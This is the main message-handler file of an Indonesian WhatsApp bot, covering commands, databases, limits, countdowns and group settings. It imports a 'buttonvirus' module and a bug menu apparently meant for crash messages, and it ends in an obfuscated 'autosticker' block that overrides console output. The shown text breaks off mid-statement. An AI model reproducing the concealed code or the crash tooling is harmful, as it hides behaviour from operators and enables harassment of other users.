require('../options/config')
var { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
var crypto = require('crypto')
var webp = require('node-webpmux')
var { sizeFormatter } = require('human-readable')
var maker = require('mumaker')
var fetch = require('node-fetch')
var jsdom = require('jsdom')
var fs = require('fs')
var { Primbon } = require('scrape-primbon')
var primbon = new Primbon()
var ms = require('ms')
var util = require('util')
var chalk = require('chalk')
var { exec, spawn, execSync } = require("child_process")
var axios = require('axios')
var path = require('path')
var os = require('os')
var qrcode = require('qrcode')
var moment = require('moment-timezone')
var { JSDOM } = require('jsdom')
var speed = require('performance-now')
var FormData = require("form-data")
var { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, makeid, reSize, textParse } = require('../message/myfunc')
var { pinterest, wallpaper, wikimedia, quotesAnime } = require('../message/scraper')
var { jadibot, listJadibot } = require('../message/jadibot')
var { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('../message/respon-list')
var { addRespons, checkRespons, deleteRespons } = require('../message/respon')
var { menu, funMenu, gcMenu, convertMenu, randomMenu, downloadMenu, ownerMenu, anonymousMenu, databaseMenu, islamicMenu, chargerMenu, makerMenu, bugMenu, soundMenu, donasiMenu, mainMenu, topupMenu, sistemMenu, panelMenu, textPro } = require('../message/help')
var { antiSpam } = require('../message/antispam')
var { color, bgcolor } = require('../message/color')
var { buttonvirus } = require('../message/buttonvirus')
var { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("../message/badword");
var { mediafireDl } = require('../message/mediafire.js')

//---------------------------[ Waktu Asia & Time ]--------------------------------//
const time = moment.tz('Asia/Jakarta').format("HH:mm:ss")
const jam = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')

//TIME
const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//

var tebaklagu = db.data.game.tebaklagu = []
var _family100 = db.data.game.family100 = []
var kuismath = db.data.game.math = []
var tebakgambar = db.data.game.tebakgambar = []
var tebakkata = db.data.game.tebakkata = []
var caklontong = db.data.game.lontong = []
var caklontong_desk = db.data.game.lontong_desk = []
var tebakkalimat = db.data.game.kalimat = []
var tebaklirik = db.data.game.lirik = []
var tebaktebakan = db.data.game.tebakan = []
var vote = db.data.others.vote = []
var menfes = db.data.others.menfes = []
var db_user = db.data.others.user = []
var db_prem = db.data.others.prem = []
var _autostick = db.data.others.autostick = []
var autosticker = db.data.others.autosticker = []

let prem = JSON.parse(fs.readFileSync('./json/premium.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./json/list-message.json'))
let addusrp = JSON.parse(fs.readFileSync('./json/userpanel/user.json'))
let badword = JSON.parse(fs.readFileSync('./json/badword.json'))
let grupbadword = JSON.parse(fs.readFileSync('./json/grupbadword.json'))
let senbadword = JSON.parse(fs.readFileSync('./json/senbadword.json'))
//━━━━━━━━━━━━━━━[ MODULE EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = liaacans = async (liaacans, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var args = body.trim().split(/ +/).slice(1)
var pushname = m.pushName || "No Name"
var botNumber = await liaacans.decodeJid(liaacans.user.id)
var isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
var itsMe = m.sender == botNumber ? true : false
var text = q = args.join(" ")
var quoted = m.quoted ? m.quoted : m
var mime = (quoted.msg || quoted).mimetype || ''
var isMedia = /image|video|sticker|audio/.test(mime)
var groupMetadata = m.isGroup ? await liaacans.groupMetadata(m.chat).catch(e => {}) : ''
var groupName = m.isGroup ? groupMetadata.subject : ''
var participants = m.isGroup ? await groupMetadata.participants : ''
var groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
var groupOwner = m.isGroup ? groupMetadata.owner : ''
 var isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
 var isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var isPremium = prem.includes(m.sender)
var isAutoStick = _autostick.includes(m.chat)
var isAutoSticker = m.isGroup ? autosticker.includes(m.chat) : false
var isBadword = m.isGroup ? grupbadword.includes(m.chat) : false

	
//━━━━━━━━━━━━━━━[ FUNCTION ]━━━━━━━━━━━━━━━━━//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}

    
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
if (!('antiwame' in chats)) chats.antiwame = false
if (!('antiviewonce' in chats)) chats.antiviewonce = false
if (!('antilinkig' in chats)) chats.antilinkig = false
if (!('antivirtex' in chats)) chats.antivirtex = false
if (!('antibadword' in chats)) chats.antibadword = false
} else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
antilinkig: false,
antiwame: false,
antivirtex: false,
antibadword: false,
antiviewonce: false
}


var creator = `${global.creatorr}\nWebsite : https://cloudpedia.biz.id`

var footer = `Note : Jangan Spam Bot!! Jika Tidak Ingin Diblokir Bot\nQuotes : ${global.quotes}`
		
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!('autobio' in setting)) setting.autobio = true
if (!('autotyping' in setting)) setting.autotyping = false
if (!('autorecording' in setting)) setting.autorecording = false
} else global.db.data.settings[botNumber] = {
status: 0,
autobio: true,
autotyping: false,
autorecording: false,
}
	    
} catch (err) {
console.error(err)
}

	   
//━━━━━━━━━━━━━━━[ PUBLIC & SELF ]━━━━━━━━━━━━━━━━━//

// Public & Self
        if (!liaacans.public) {
            if (!m.key.fromMe) return
        }

//━━━━━━━━━━━━━━━[ RESET LIMIT ]━━━━━━━━━━━━━━━━━//

let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
        
//━━━━━━━━━━━━━━━[ AUTO SET BIO && TYPING ]━━━━━━━━━━━━━━━━━//

if (db.data.settings[botNumber].autobio) {
let setting = global.db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await liaacans.setStatus(`${liaacans.user.name} | Runtime : ${runtime(process.uptime())}`)
setting.status = new Date() * 1
}
}

if (db.data.settings[botNumber].autotyping) { 
if (m.chat) { 
   liaacans.sendPresenceUpdate('composing', m.chat) 
}
}

if (db.data.settings[botNumber].autorecording) { 
if (m.chat) { 
   liaacans.sendPresenceUpdate('recording', m.chat) 
}
}

//━━━━━━━━━━━━━━━[ Hitung Mundur ]━━━━━━━━━━━━━━━━━//

countDownDate = new Date("2023-07-09").getTime();
var now = new Date().getTime();
var distance = countDownDate - now;
var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var secondss = Math.floor((distance % (1000 * 60)) / 1000);
ultahown = `*${dayss} hari, ${hourss} jam, ${minutess} menit*`

countDownDate = new Date("2024-03-10").getTime();
var now = new Date().getTime();
var distance = countDownDate - now;
var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var secondss = Math.floor((distance % (1000 * 60)) / 1000);
Ramadhan = `*${dayss} hari, ${hourss} jam, ${minutess} menit*`

countDownDate = new Date("2024-01-01").getTime();
var now = new Date().getTime();
var distance = countDownDate - now;
var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var secondss = Math.floor((distance % (1000 * 60)) / 1000);
tahunbaru = `*${dayss} hari, ${hourss} jam, ${minutess} menit*`

countDownDate = new Date("2024-04-10").getTime();
var now = new Date().getTime();
var distance = countDownDate - now;
var dayss = Math.floor(distance / (1000 * 60 * 60 * 24));
var hourss = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
var minutess = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
var secondss = Math.floor((distance % (1000 * 60)) / 1000);
harirayaif = `*${dayss} hari, ${hourss} jam, ${minutess} menit*`

//by andigans :v

//━━━━━━━━━━━━━━━[ Auto Read ]━━━━━━━━━━━━━━━━━//

if (m.message) {
            liaacans.readMessages([m.key])
        }

//━━━━━━━━━━━━━━━[ FUNCTION GROUP & PC ]━━━━━━━━━━━━━━━━━//

// Autosticker gc || AUTO STICKER LANGKA
(function(_0xc1dd97,_0x22bbcd){function _0x26e966(_0x1c3e57,_0x241899,_0x207506,_0x59aed3){return _0x39f7(_0x1c3e57-0x36,_0x241899);}const _0x206c28=_0xc1dd97();function _0x1953a9(_0x225e18,_0x310261,_0xa23019,_0x5ebf13){return _0x39f7(_0x225e18-0x15d,_0x310261);}while(!![]){try{const _0x1026a8=-parseInt(_0x1953a9(0x2a3,0x2ad,0x280,0x28f))/(0x23f4+0x1*-0x7ed+0xe03*-0x2)+parseInt(_0x26e966(0x15c,0x151,0x140,0x13d))/(-0x25b6+-0xae*0x29+0x68f*0xa)*(parseInt(_0x1953a9(0x2bc,0x2ab,0x2ce,0x2da))/(-0x1*0x102f+-0x3e*0x47+0x2164))+parseInt(_0x26e966(0x1a0,0x189,0x177,0x1be))/(-0x1b25+-0x1*0x1ab9+-0x39*-0xf2)+parseInt(_0x1953a9(0x29c,0x29f,0x294,0x2ac))/(0x35d*0x2+0xb01+-0x11b6)*(parseInt(_0x1953a9(0x286,0x268,0x28c,0x279))/(0x55f+0x13b+0x1a5*-0x4))+-parseInt(_0x26e966(0x16e,0x16f,0x15c,0x149))/(0x13be+0x1662+0x1*-0x2a19)*(parseInt(_0x1953a9(0x29e,0x297,0x295,0x28d))/(-0x2*0x3c2+0x25c0+-0x1e34))+parseInt(_0x1953a9(0x2b8,0x2dd,0x292,0x293))/(-0x1e38+0x1*0xe27+0x101a)*(-parseInt(_0x1953a9(0x2a7,0x2b2,0x297,0x2a0))/(0xf06+-0x10b2+0x1b6))+parseInt(_0x26e966(0x182,0x19b,0x192,0x18b))/(-0xc17+-0xd5+0xcf7);if(_0x1026a8===_0x22bbcd)break;else _0x206c28['push'](_0x206c28['shift']());}catch(_0x2ea491){_0x206c28['push'](_0x206c28['shift']());}}}(_0x2cf7,0x15e9c+0x1*-0x41f6f+0x1e88*0x29));function _0x2cf7(){const _0x40b4dc=['GAOpS','CYRaY','2575ZzYpSb','YXeaX','1356200JiZGcf','JPbOG','JxpVn','toString','WCUUd','125399cryQat','prototype','info','Ydtsk','47090OBcgEa','log','1093235KCuXLj','etuwh','OYrkT','er\x20detecte','search','nzVKD','object','Auto\x20stick','ZITHG','Aobzy','console','VUoTV','iWPHa','dRkqQ','gyUBr','171OWpGeU','TQmdE','UyZfm','xPjnO','37275wUkunw','exception','fBflA','QbeWO','kcNKI','sSticker','zVGmd','pmvpM','packname','XvfPa','dNwqX','714904unwGFI','warn','download','chat','msg','error','WJaSR','KdDcI','author','table','apply','dOCtW','test','trace','20iySiFo','length','paDPW','1422NFbExF','btweZ','rVqPB','(((.+)+)+)','undefined','qVJkQ','kMgkE','grbMa','sendImageA','sendVideoA','FhYfh','XKYmp','__proto__','constructo','RSlbk','7pSlOJn','wFWQJ','function','bind','seconds'];_0x2cf7=function(){return _0x40b4dc;};return _0x2cf7();}const _0x5823ca=(function(){const _0x6f5af1={};_0x6f5af1[_0x5b9a50(0x46a,0x456,0x46f,0x451)]=function(_0xdeecb1,_0x4bb19f){return _0xdeecb1!==_0x4bb19f;},_0x6f5af1[_0x106b96(0x27a,0x269,0x272,0x26e)]='MENEQ',_0x6f5af1['fBflA']=_0x106b96(0x23e,0x22d,0x245,0x222)+'+$',_0x6f5af1[_0x5b9a50(0x44d,0x471,0x463,0x47b)]=_0x5b9a50(0x48b,0x49c,0x4a3,0x487),_0x6f5af1[_0x5b9a50(0x47e,0x463,0x43d,0x44c)]=_0x5b9a50(0x493,0x4a4,0x47c,0x492);const _0x14775a=_0x6f5af1;let _0x150feb=!![];function _0x5b9a50(_0x16e993,_0x20a546,_0xa9ceb2,_0x1361b5){return _0x39f7(_0x20a546-0x333,_0x1361b5);}function _0x106b96(_0xb98e1f,_0x3f830b,_0x172b21,_0x301169){return _0x39f7(_0x172b21-0x119,_0x3f830b);}return function(_0x52a0dc,_0x4bef58){function _0x11e829(_0x2510ed,_0x16020e,_0x275629,_0x2eb855){return _0x5b9a50(_0x2510ed-0x157,_0x2510ed- -0x4f0,_0x275629-0x195,_0x2eb855);}const _0x469d2d={};function _0x55b34b(_0x250e4b,_0x5adfcc,_0x4aad2c,_0x32b1d6){return _0x5b9a50(_0x250e4b-0x1f2,_0x4aad2c- -0x345,_0x4aad2c-0x145,_0x250e4b);}_0x469d2d[_0x55b34b(0x143,0x12d,0x142,0x14c)]=_0x14775a[_0x11e829(-0x5c,-0x51,-0x6f,-0x5e)];const _0x27efa4=_0x469d2d;if(_0x14775a[_0x55b34b(0xf3,0x107,0x111,0x101)](_0x14775a[_0x11e829(-0x7f,-0x82,-0xa7,-0x72)],_0x14775a['grbMa'])){const _0x1955e2=_0x150feb?function(){function _0x58c8fa(_0xccb78e,_0x269e3e,_0x3df782,_0x48af1){return _0x55b34b(_0xccb78e,_0x269e3e-0x87,_0x269e3e-0x2a9,_0x48af1-0x96);}function _0x4d5bc0(_0x196a07,_0x3e414c,_0x1fb998,_0x37ddb1){return _0x11e829(_0x1fb998- -0x71,_0x3e414c-0xc6,_0x1fb998-0xd7,_0x196a07);}if(_0x14775a['dOCtW'](_0x14775a['dRkqQ'],_0x14775a[_0x4d5bc0(-0xbd,-0xb9,-0xd5,-0xbf)]))return _0x431c94[_0x4d5bc0(-0xcc,-0xd0,-0xea,-0xe5)]()[_0x4d5bc0(-0xd9,-0xf5,-0xde,-0xbe)](_0x27efa4[_0x4d5bc0(-0x103,-0xd9,-0xda,-0xfd)])[_0x4d5bc0(-0x10d,-0xfb,-0xea,-0xe7)]()[_0x4d5bc0(-0x11a,-0xf4,-0xf8,-0xd3)+'r'](_0x394608)['search'](_0x27efa4[_0x58c8fa(0x3c4,0x3eb,0x3d7,0x408)]);else{if(_0x4bef58){const _0x129c73=_0x4bef58['apply'](_0x52a0dc,arguments);return _0x4bef58=null,_0x129c73;}}}:function(){};return _0x150feb=![],_0x1955e2;}else{const _0x25b659=_0x5144f0['apply'](_0x4e52f5,arguments);return _0x31abd2=null,_0x25b659;}};}()),_0x1fcf3f=_0x5823ca(this,function(){function _0x1f85ae(_0x3efe50,_0x59d08c,_0x418740,_0x5be2cc){return _0x39f7(_0x418740-0x3a0,_0x59d08c);}const _0x3e46d2={};function _0x1a1a60(_0x1659c0,_0x5afe25,_0x1b8a19,_0x3334b6){return _0x39f7(_0x1659c0-0x1bb,_0x5afe25);}_0x3e46d2[_0x1a1a60(0x2ee,0x2e5,0x2d8,0x2e4)]='(((.+)+)+)'+'+$';const _0x71b1e4=_0x3e46d2;return _0x1fcf3f['toString']()[_0x1f85ae(0x4f1,0x4e2,0x4f0,0x4f2)](_0x71b1e4[_0x1f85ae(0x4e7,0x4fa,0x4d3,0x4b0)])[_0x1a1a60(0x2ff,0x326,0x324,0x2f5)]()[_0x1a1a60(0x2f1,0x306,0x306,0x2e7)+'r'](_0x1fcf3f)[_0x1f85ae(0x4f9,0x50d,0x4f0,0x4db)](_0x71b1e4['FhYfh']);});function _0x39f7(_0x1fcf3f,_0x5823ca){const _0x2cf79a=_0x2cf7();return _0x39f7=function(_0x39f7a5,_0x2fd2e9){_0x39f7a5=_0x39f7a5-(-0x246a+0xd8d+0x17ff*0x1);let _0x563cbe=_0x2cf79a[_0x39f7a5];return _0x563cbe;},_0x39f7(_0x1fcf3f,_0x5823ca);}function _0x21d3e7(_0x898cdf,_0x12ea5c,_0x3495b4,_0x168b7e){return _0x39f7(_0x12ea5c-0x3d7,_0x898cdf);}_0x1fcf3f();function _0x1c7265(_0x5d51b5,_0x305a4a,_0x2c189c,_0x499514){return _0x39f7(_0x305a4a-0x16b,_0x2c189c);}const _0x4e4b61=(function(){const _0x3058b9={};_0x3058b9[_0x2adcff(0x42a,0x3f1,0x404,0x3fc)]=function(_0x31df08,_0x4bd988){return _0x31df08===_0x4bd988;},_0x3058b9[_0x2adcff(0x426,0x43d,0x42a,0x42a)]=_0x97920b(0xec,0xdc,0xd5,0xe9),_0x3058b9[_0x97920b(0xdf,0xfc,0xd6,0xd7)]=function(_0x7dbac1,_0xdbf5f2){return _0x7dbac1!==_0xdbf5f2;};function _0x2adcff(_0x2fd699,_0x3aae36,_0x23c1f4,_0x1fb14b){return _0x39f7(_0x23c1f4-0x2c2,_0x2fd699);}_0x3058b9[_0x97920b(0xa1,0x95,0xa8,0x93)]=_0x97920b(0xae,0xc0,0xd0,0xb0),_0x3058b9[_0x97920b(0xce,0xa6,0xc7,0xe9)]='function',_0x3058b9[_0x97920b(0xf4,0xfb,0xda,0xe3)]=_0x97920b(0xc9,0xcd,0xc9,0xd3),_0x3058b9['xFjAw']=_0x2adcff(0x417,0x425,0x422,0x427),_0x3058b9[_0x2adcff(0x3e5,0x400,0x402,0x3f9)]=_0x2adcff(0x3f5,0x410,0x3e7,0x3de),_0x3058b9[_0x97920b(0x9e,0x8a,0xac,0xc8)]=_0x2adcff(0x43a,0x40b,0x41c,0x41c);function _0x97920b(_0x34366f,_0x579ee3,_0x25a14e,_0x2b3d8f){return _0x39f7(_0x25a14e- -0x82,_0x579ee3);}const _0x4b1422=_0x3058b9;let _0x279415=!![];return function(_0x265296,_0x54c692){function _0x404acf(_0x3304fb,_0x59531f,_0x6badb3,_0x565e7e){return _0x97920b(_0x3304fb-0x1b,_0x3304fb,_0x59531f-0x364,_0x565e7e-0x2b);}function _0x3bb20c(_0x3d944b,_0x4d7034,_0x2c7e7c,_0xddedc3){return _0x2adcff(_0x3d944b,_0x4d7034-0xa,_0xddedc3- -0x71,_0xddedc3-0x1dd);}const _0x5d138e={'pmvpM':function(_0x13294e,_0x277b18){return _0x4b1422['JPbOG'](_0x13294e,_0x277b18);},'GAOpS':_0x4b1422[_0x404acf(0x449,0x44a,0x44e,0x44f)],'nzVKD':function(_0x7a8f19,_0x573c63){return _0x4b1422['iWPHa'](_0x7a8f19,_0x573c63);},'wFWQJ':function(_0x174606,_0x28cf7e){return _0x174606===_0x28cf7e;},'RSlbk':_0x4b1422[_0x3bb20c(0x378,0x384,0x379,0x37b)],'hBrye':function(_0x4aa2ca,_0x3f5bb7){function _0x194859(_0x2722b2,_0x124a85,_0x44576b,_0x41a2a8){return _0x404acf(_0x41a2a8,_0x44576b- -0x111,_0x44576b-0xe7,_0x41a2a8-0x1a9);}return _0x4b1422[_0x194859(0x33b,0x2f3,0x313,0x32b)](_0x4aa2ca,_0x3f5bb7);},'veANB':_0x4b1422[_0x404acf(0x425,0x42b,0x44e,0x408)],'zVGmd':_0x4b1422[_0x404acf(0x45e,0x43e,0x440,0x457)],'gXIBq':_0x3bb20c(0x370,0x3a1,0x370,0x399),'QbeWO':_0x4b1422['xFjAw'],'UyZfm':_0x4b1422[_0x3bb20c(0x388,0x36f,0x371,0x391)]};if(_0x4b1422[_0x3bb20c(0x390,0x35f,0x35b,0x37f)]==='gyUBr'){const _0x54aa0b=_0x279415?function(){function _0xbd773d(_0x155e80,_0x179fd1,_0x59fd1e,_0x241c09){return _0x404acf(_0x155e80,_0x179fd1- -0x427,_0x59fd1e-0xf5,_0x241c09-0xf3);}function _0x355354(_0x53ced1,_0x3a2807,_0x31c524,_0x4d77de){return _0x404acf(_0x53ced1,_0x3a2807- -0x168,_0x31c524-0x168,_0x4d77de-0x1);}if(_0x54c692){if(_0x5d138e[_0x355354(0x2d3,0x2e0,0x2c7,0x2de)](_0x5d138e[_0xbd773d(-0x21,-0x8,-0x28,-0x7)],'QkhPv')){const _0x346d4f=_0x259a16?function(){function _0x3f2400(_0xba30a8,_0x406e22,_0x30eb0a,_0x155c26){return _0xbd773d(_0x155c26,_0x406e22-0x149,_0x30eb0a-0x78,_0x155c26-0x1b2);}if(_0x244a00){const _0x76cd40=_0xd16e76[_0x3f2400(0x116,0x126,0x11c,0x10d)](_0x161ddd,arguments);return _0x45527a=null,_0x76cd40;}}:function(){};return _0x52250d=![],_0x346d4f;}else{const _0x23de75=_0x54c692[_0xbd773d(0x6,-0x23,-0x13,-0x11)](_0x265296,arguments);return _0x54c692=null,_0x23de75;}}}:function(){};return _0x279415=![],_0x54aa0b;}else{const _0x2acfa3=_0x5d138e[_0x404acf(0x419,0x433,0x43d,0x411)](typeof _0x3d9ca5,_0x3bb20c(0x36f,0x39b,0x3a1,0x37e))?_0x23bce4:_0x5d138e[_0x404acf(0x441,0x41b,0x442,0x41e)](typeof _0x20f8e0,_0x5d138e[_0x404acf(0x42d,0x419,0x431,0x426)])&&_0x5d138e['hBrye'](typeof _0x25797d,_0x5d138e['veANB'])&&_0x5d138e[_0x404acf(0x43d,0x448,0x463,0x448)](typeof _0x3fd5cf,_0x404acf(0x424,0x434,0x421,0x439))?_0x39eba1:this,_0xa3931b=_0x2acfa3[_0x3bb20c(0x39d,0x383,0x3a8,0x3a7)]=_0x2acfa3[_0x404acf(0x441,0x438,0x45b,0x441)]||{},_0x249ac0=[_0x5d138e[_0x404acf(0x46d,0x447,0x446,0x42d)],_0x404acf(0x434,0x44d,0x470,0x439),_0x5d138e['gXIBq'],_0x3bb20c(0x3af,0x3c1,0x3b1,0x3c0),_0x5d138e[_0x3bb20c(0x3af,0x3b5,0x3d8,0x3b3)],_0x404acf(0x444,0x455,0x44b,0x447),_0x5d138e[_0x404acf(0x440,0x43f,0x43e,0x44b)]];for(let _0x22909f=-0x4*0x12b+0x7*-0x4d9+0x269b;_0x22909f<_0x249ac0[_0x3bb20c(0x358,0x38b,0x357,0x378)];_0x22909f++){const _0x29a93e=_0x4bfc92[_0x404acf(0x401,0x418,0x43b,0x439)+'r'][_0x3bb20c(0x385,0x387,0x38d,0x398)]['bind'](_0x2eaa65),_0x406b99=_0x249ac0[_0x22909f],_0xae6675=_0xa3931b[_0x406b99]||_0x29a93e;_0x29a93e[_0x3bb20c(0x388,0x370,0x3aa,0x386)]=_0x2b35fe[_0x404acf(0x43f,0x41d,0x418,0x422)](_0x1383ab),_0x29a93e['toString']=_0xae6675[_0x404acf(0x42e,0x426,0x40a,0x41f)][_0x404acf(0x433,0x41d,0x400,0x422)](_0xae6675),_0xa3931b[_0x406b99]=_0x29a93e;}}};}()),_0x6ee8e3=_0x4e4b61(this,function(){const _0x303930={};function _0x4e48f3(_0x1de6ca,_0x18618f,_0x3b05e2,_0x32793f){return _0x39f7(_0x1de6ca- -0x294,_0x18618f);}_0x303930[_0x3a1025(-0x220,-0x20b,-0x217,-0x221)]=function(_0x59a12e,_0x338a25){return _0x59a12e!==_0x338a25;},_0x303930[_0x3a1025(-0x1f8,-0x214,-0x20e,-0x232)]='undefined';function _0x3a1025(_0x32591c,_0x15db23,_0x7792ee,_0x25db36){return _0x39f7(_0x15db23- -0x33f,_0x7792ee);}_0x303930[_0x3a1025(-0x1df,-0x1f2,-0x1d3,-0x1c9)]=function(_0x3002eb,_0xbcbd09){return _0x3002eb===_0xbcbd09;},_0x303930[_0x3a1025(-0x20d,-0x210,-0x22f,-0x1f0)]='object',_0x303930['JDgHM']=function(_0x5513ef,_0x2297e7){return _0x5513ef===_0x2297e7;},_0x303930[_0x3a1025(-0x203,-0x1dc,-0x200,-0x1f4)]=_0x4e48f3(-0x15a,-0x139,-0x14e,-0x15f),_0x303930[_0x4e48f3(-0x146,-0x16f,-0x13a,-0x120)]='log',_0x303930['Aobzy']=_0x3a1025(-0x1ec,-0x1d4,-0x1b1,-0x1ab),_0x303930[_0x3a1025(-0x1b9,-0x1cf,-0x1cd,-0x1ac)]=_0x4e48f3(-0x14c,-0x126,-0x123,-0x16e),_0x303930[_0x4e48f3(-0x151,-0x174,-0x12a,-0x167)]=_0x3a1025(-0x1ce,-0x1d0,-0x1b3,-0x1d2),_0x303930[_0x4e48f3(-0x136,-0x15a,-0x154,-0x130)]=_0x4e48f3(-0x134,-0x145,-0x110,-0x14b),_0x303930[_0x4e48f3(-0x14f,-0x129,-0x12c,-0x162)]=_0x3a1025(-0x1b4,-0x1cc,-0x1c2,-0x1cf),_0x303930[_0x4e48f3(-0x16c,-0x166,-0x17b,-0x18e)]=function(_0x34d0d2,_0xd9ecf5){return _0x34d0d2<_0xd9ecf5;};const _0x5cec3c=_0x303930,_0x349f=_0x5cec3c['XKYmp'](typeof window,_0x5cec3c['rVqPB'])?window:_0x5cec3c[_0x4e48f3(-0x147,-0x16b,-0x167,-0x123)](typeof process,_0x5cec3c[_0x4e48f3(-0x165,-0x15a,-0x13c,-0x168)])&&_0x5cec3c['JDgHM'](typeof require,_0x5cec3c['kcNKI'])&&_0x5cec3c[_0x4e48f3(-0x147,-0x151,-0x120,-0x14d)](typeof global,_0x5cec3c['kMgkE'])?global:this,_0x465f90=_0x349f[_0x3a1025(-0x202,-0x1e9,-0x20f,-0x212)]=_0x349f[_0x3a1025(-0x1ed,-0x1e9,-0x1ee,-0x1ea)]||{},_0x1bd013=[_0x5cec3c[_0x4e48f3(-0x146,-0x13a,-0x163,-0x124)],_0x5cec3c[_0x3a1025(-0x1e3,-0x1ea,-0x1ef,-0x1c1)],_0x5cec3c[_0x4e48f3(-0x124,-0x138,-0x13e,-0x12d)],_0x5cec3c[_0x3a1025(-0x207,-0x1fc,-0x1f0,-0x1f0)],_0x5cec3c[_0x3a1025(-0x1bf,-0x1e1,-0x1d6,-0x1f6)],_0x5cec3c[_0x4e48f3(-0x14f,-0x151,-0x136,-0x13f)],'trace'];for(let _0x57069f=0xf28+0x8d0+0x76*-0x34;_0x5cec3c[_0x4e48f3(-0x16c,-0x167,-0x180,-0x15b)](_0x57069f,_0x1bd013[_0x4e48f3(-0x16d,-0x169,-0x155,-0x180)]);_0x57069f++){const 